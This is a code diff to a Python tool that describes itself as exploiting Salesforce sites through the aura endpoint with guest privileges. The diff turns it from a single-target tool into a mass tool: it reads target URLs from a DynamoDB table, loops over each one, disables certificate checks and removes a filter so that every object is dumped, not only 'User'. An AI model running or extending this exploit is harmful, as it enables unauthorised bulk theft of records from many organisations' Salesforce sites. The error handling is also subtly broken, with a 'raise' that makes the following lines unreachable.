@@ -8,6 +8,8 @@ import re
 import os
 import sys
 import ssl
+import boto3
+
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
@@ -68,7 +70,6 @@ def check(url):
 
 
 def get_aura_context(url):
-    
     response_body = ''
     try:
         response_body = http_request(url)
@@ -220,8 +221,6 @@ def dump_and_save_objects(aura_endpoint, aura_context):
     failed_objects = []
 
     for object_name in sf_all_object_name_list:
-        if object_name != "User":
-            continue
         page = DEFAULT_PAGE
         while True:
             response = dump_object(aura_endpoint, aura_context, object_name, page_size, page)
@@ -240,10 +239,16 @@ def dump_and_save_objects(aura_endpoint, aura_context):
         for obj in failed_objects:
             print(f"{TAB}[-] {obj}")
 
+def fetch_instances():
+    dynamodb = boto3.resource('dynamodb')
+    table = dynamodb.Table("salesforce_instances")
+    instances = table.scan()["Items"]
+    return [item['url'] for item in instances]
+
     
 def init():
     parser = argparse.ArgumentParser(description='Exploit Salesforce through the aura endpoint with the guest privilege')
-    parser.add_argument('-u', '--url', required=True, help='set the SITE url. e.g. http://url/site_path')
+    # parser.add_argument('-u', '--url', required=True, help='set the SITE url. e.g. http://url/site_path')
     parser.add_argument('-o', '--objects', 
         help='set the object name. Default value is "User" object. Juicy Objects: %s' % ",".join(SF_OBJECT_NAME), 
         nargs='*', default=['User'])
@@ -259,37 +264,40 @@ def init():
     
 
 if __name__ == "__main__":
+    instances = fetch_instances()
     args = init()
-    aura_endpoints = check(args.url)
+    for instance in instances:
+        print(f"[*] Checking for aura endpoints on {instance}")
+        aura_endpoints = check(instance)
+        if len(aura_endpoints) == 0:
+            print("[-] No aura endpoints found\n")
+            continue
 
-    if len(aura_endpoints) == 0:
-        print("[-] No aura endpoints found")
-        sys.exit(0)
+        if args.check:
+            continue
 
-    if args.check:        
-        sys.exit(0)
+        if args.aura_context is not None and len(args.aura_context) > 1:
+            aura_context = args.aura_context
+        else:
+            try:
+                aura_context = get_aura_context(instance)
+            except Exception as e:
+                raise
+                print("[-] Failed to get aura context\n")
+                continue
 
-    if args.aura_context is not None and len(args.aura_context) > 1:
-        aura_context = args.aura_context
-    else:
-        try:
-            aura_context = get_aura_context(args.url)
-        except Exception as e:
-            print("[-] Failed to get aura context.")
-            sys.exit(0)
+        for aura_endpoint in aura_endpoints:
+            print(f"[*] Working with endpoint {aura_endpoint}")
 
-    for aura_endpoint in aura_endpoints:
-        print(f"[*] Working with endpoint {aura_endpoint}")
+            if args.listobj:
+                sf_all_object_name_list = pull_object_list(aura_endpoint, aura_context)
 
-        if args.listobj:
-            sf_all_object_name_list = pull_object_list(aura_endpoint, aura_context)
+            elif args.dump_objects:
+                dump_and_save_objects(aura_endpoint, aura_context)
 
-        elif args.dump_objects:
-            dump_and_save_objects(aura_endpoint, aura_context)
+            elif args.objects:
+                for object_name in args.objects:
+                    dump_object(aura_endpoint, aura_context, object_name)
 
-        elif args.objects:
-            for object_name in args.objects:
-                dump_object(aura_endpoint, aura_context, object_name)
-
-        if not args.mass_collect:
-            break
+            if not args.mass_collect:
+                break
